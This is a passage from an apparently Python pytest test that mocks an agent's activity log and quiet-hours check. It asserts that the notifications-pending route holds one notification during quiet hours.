    agent_ = SimpleNamespace(context=SimpleNamespace(memory_dir=str(tmp_path / "memory"),
                                                     last_activity_time=datetime.datetime.min))
    monkeypatch.setattr(routes, "get_agent", lambda r: agent_)
    monkeypatch.setattr(aa, "get_activity_log", lambda ctx: log)
    monkeypatch.setattr(aa, "load_consumer_offset", lambda path, consumer: 5)
    monkeypatch.setattr(aa, "in_quiet_hours", lambda *a, **k: True)
    body = json.loads(asyncio.run(routes.notifications_pending(MagicMock(), consumer="cli")).body)
    assert body.get("quiet_hours") is True and body.get("held") == 1, body